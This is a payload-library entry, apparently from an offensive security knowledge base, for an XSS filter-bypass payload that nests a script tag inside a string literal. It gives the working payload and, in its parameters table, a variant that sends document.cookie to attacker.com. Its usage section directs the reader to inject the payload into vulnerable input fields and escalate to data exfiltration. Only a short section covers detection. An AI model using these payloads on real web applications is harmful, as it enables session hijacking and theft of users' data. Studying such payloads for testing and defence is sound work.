---
id: 9352712d-968f-491c-9429-79080bfe8beb
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.723788+00:00'
updated_at: '2023-04-10T20:21:45.724927+00:00'
tags:
  - xss
  - payload
  - bypass
platforms:
  - Web
validated: true
---

# XSS-Bypass-Payload-Embedded-Script-In-String

## Code

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

## Description

This JavaScript payload bypasses basic XSS filters by embedding a malicious <script> tag inside a string literal within an outer <script> tag. The filter may remove the outer tags, but the string content remains, allowing the browser to parse the inner script and execute the alert(1) function. It is used in reflected or stored XSS attacks to confirm vulnerability.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(1) | Proof-of-concept execution; replace with custom JS like document.location='http://attacker.com?cookie='+document.cookie | alert(document.cookie) |

## Usage

Inject this payload into vulnerable input fields on web applications, such as search parameters or form submissions. Submit and check for the alert pop-up. For escalation, modify the inner script to exfiltrate data or load external resources. Test in contexts where user input is reflected into HTML without deep string sanitization.

## Detection

- Monitor for unusual JavaScript patterns in input logs, such as nested script tags or string literals containing HTML tags.
- Implement client-side CSP to block inline scripts.
- Use WAF rules to flag inputs with multiple <script> occurrences.
- Browser consoles may log script execution errors if partially filtered.

## Related

- [[procedures/XSS-Filter-Bypass-Using-Embedded-Script-Tags]]
